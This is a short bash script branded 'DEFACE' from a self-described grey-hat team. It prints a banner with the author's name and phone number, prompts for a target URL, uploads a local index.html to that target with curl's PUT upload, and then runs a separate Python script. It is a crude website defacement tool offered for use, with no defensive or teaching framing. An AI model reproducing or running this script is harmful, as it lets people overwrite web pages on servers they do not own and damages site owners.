#!/bin/bash
##########################################
# AUTHOR : ARJUN-ID                      #
# TEAM   : Kebumen Grey Hat              #
# Thanks : Tn./Restu                     #
##########################################
clear
figlet DEFACE | lolcat
echo "~# AUTHOR : ARJUNZ-ID"
echo "~# TEAM   : Kebumen Grey Hat"
echo "~# CONTACT: 083869752666"
echo "~# Support: Tn./Restu"
echo "~# Thx All: Member"
echo
echo
read -p "~# Input Your Script: " fil;
sleep 2
read -p "~# Input Your Target: " ta;
curl -T /storage/emulated/0/index.html $ta
python2 jalan.py

echo "~# RESULT:" $ta

